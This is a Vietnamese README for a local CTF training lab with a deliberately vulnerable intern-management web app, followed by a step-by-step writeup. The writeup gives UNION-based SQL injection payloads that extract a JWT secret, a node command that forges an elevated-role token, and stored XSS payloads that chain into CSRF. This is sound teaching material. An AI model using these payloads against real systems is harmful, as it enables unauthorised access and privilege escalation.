# THE TRAINING GROUND

Hệ thống quản lý thực tập sinh - Lab CTF ôn tập Web Vulnerability.

## Yêu cầu

- Docker & Docker Compose

## Deploy

```bash
docker compose up --build
```

Truy cập: http://localhost:3000

## Mục tiêu

Tìm flag hiển thị trên Dashboard của bạn (sau khi đăng nhập) hoặc tại endpoint `/api/flag`.

Flag format: `CKGW{<username>_<mã_số>}`

---

## Gợi ý / Hướng dẫn giải (Writeup)

### Bước 1: HTTP Method Bypass

**Endpoint:** `/admin-gateway`

Xem source code trang chủ (view page source) phát hiện comment HTML chứa endpoint `/admin-gateway`.

- `GET /admin-gateway` → Báo lỗi `Giao thức không hỗ trợ`
- `POST /admin-gateway` → Hiển thị trang tra cứu

**Kỹ thuật:** HTTP Method Enumeration & Bypass.

### Bước 2: Classic SQL Injection (UNION-based)

**Endpoint:** `POST /admin-gateway` → form tìm kiếm gọi `GET /api/search?name=`

Tham số `name` được nối trực tiếp vào câu truy vấn SQL mà không qua filter:

```sql
SELECT id, name, email, department FROM interns WHERE name LIKE '%{input}%'
```

**Khai thác:**

1. Xác định số cột: `' ORDER BY 1--` ... `' ORDER BY 4--` (4 cột)
2. Lấy danh sách bảng:
   ```
   ' UNION SELECT 1, name, sql, 4 FROM sqlite_master--
   ```
3. Trích xuất JWT secret từ bảng `system_config`:
   ```
   ' UNION SELECT 1, key, value, 4 FROM system_config--
   ```

**Kết quả:** `JWT_SECRET = super_secret_key_123`

**Kỹ thuật:** SQL Injection UNION-based, khai thác SQLite system tables.

### Bước 3: Weak JWT Forgery

Hệ thống sử dụng JWT để xác thực. Token được lưu trong cookie `token`.

**Payload JWT gốc (intern):**
```json
{"username": "...", "role": "intern"}
```

Khi đăng nhập với tài khoản thường, role là `intern`. Truy cập `/employee/dashboard` bị từ chối.

**Khai thác:**

Dùng secret `super_secret_key_123` (lấy từ Bước 2) để ký lại JWT với role `employee`:

```bash
node -e "
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  {username: 'your_username', role: 'employee'},
  'super_secret_key_123',
  {expiresIn: '24h'}
);
console.log(token);
"
```

Gửi token mới qua cookie `token` để truy cập `/employee/dashboard`.

**Kỹ thuật:** JWT Weak Secret, Role Escalation bằng token forgery.

### Bước 4: Stored XSS

Tại `/employee/dashboard`, có chức năng "Gửi phản hồi cho Ban Giám Đốc".

Dữ liệu đầu vào được lưu vào database và render trực tiếp ra trang `/admin/review-feedbacks` **không qua escape HTML** (dùng `<%- %>` thay vì `<%= %>` trong EJS).

**Khai thác:** Gửi feedback chứa mã JavaScript độc hại:

```html
<img src=x onerror="fetch('/admin/generate_flag?user=your_username')">
```

hoặc

```html
<script>fetch('/admin/generate_flag?user=your_username')</script>
```

**Kỹ thuật:** Stored Cross-Site Scripting (XSS).

### Bước 5: CSRF thông qua XSS (Exploit Chain)

Có endpoint ẩn `/admin/generate_flag?user=<username>` chỉ admin mới được gọi (kiểm tra `role=admin` trong JWT).

Cookie không có cấu hình SameSite bảo mật, CSRF token không tồn tại.

Cơ chế Admin Bot: Cứ 20 giây, bot (mang JWT admin) quét feedback chưa duyệt. Nếu phát hiện nội dung có chứa mẫu `generate_flag?user=XXX`, bot sẽ tự động ghi flag cho user đó vào database - mô phỏng việc Admin trình duyệt kích hoạt CSRF.

**Luồng tấn công hoàn chỉnh:**

```
1. POST /admin-gateway (Method Bypass)
       ↓
2. SQLi → JWT_SECRET (UNION SELECT)
       ↓
3. Forge JWT: role=employee (Token Forgery)
       ↓
4. Gửi feedback chứa XSS → Admin Bot đọc feedback (Stored XSS)
       ↓
5. Bot phát hiện generate_flag?user=XXX → Ghi flag vào DB (CSRF)
       ↓
6. Kiểm tra flag tại /dashboard hoặc /api/flag ✓
```

**Kỹ thuật:** Cross-Site Request Forgery (CSRF) kết hợp Stored XSS để leo thang từ employee lên admin action.

---

## Cấu trúc thư mục

```
.
├── Dockerfile
├── docker-compose.yml
├── package.json
├── src/
│   ├── server.js              # Express entry point
│   ├── database.js            # SQLite init + helpers
│   ├── middleware/
│   │   └── auth.js            # JWT auth middleware
│   └── views/                 # EJS templates
│       ├── index.ejs
│       ├── gateway.ejs
│       ├── login.ejs
│       ├── register.ejs
│       ├── dashboard.ejs
│       ├── employee.ejs
│       └── admin-feedback.ejs
├── data/                      # SQLite database (gitignored)
└── README.md
```
